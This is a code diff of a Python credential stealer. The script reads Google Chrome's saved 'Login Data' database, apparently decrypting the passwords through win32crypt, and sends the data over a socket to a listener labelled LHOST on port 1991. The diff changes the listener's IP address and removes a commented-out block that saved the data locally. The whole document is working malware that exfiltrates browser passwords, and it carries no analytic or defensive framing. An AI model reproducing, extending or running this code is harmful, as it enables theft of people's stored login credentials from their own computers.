@@ -9,11 +9,10 @@ from os import remove
 import sqlite3
 import win32crypt
 import socket
-import time
 import struct
 
 
-HOST = '192.168.0.109'
+HOST = '192.168.0.104'
 PORT = 1991
 
 default_user = r'\..\Local\Google\Chrome\User Data\Default\Login Data'
@@ -78,8 +77,8 @@ finally:
     conn.close()
     conn2.close()
 
+# Connect LHOST and send login_data
 try:
-    # Connect LHOST and send login_data
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((HOST, PORT))
 
@@ -90,11 +89,6 @@ try:
             send_msg(s, binary_data)
             # data = recv_msg(s)
             # print('Received', repr(data))
-
-        # Test local
-        # if binary_data:
-        #     with open("abc.db", 'wb') as abc:
-        #         abc.write(binary_data)
 
 except Exception as e:
     print(e)
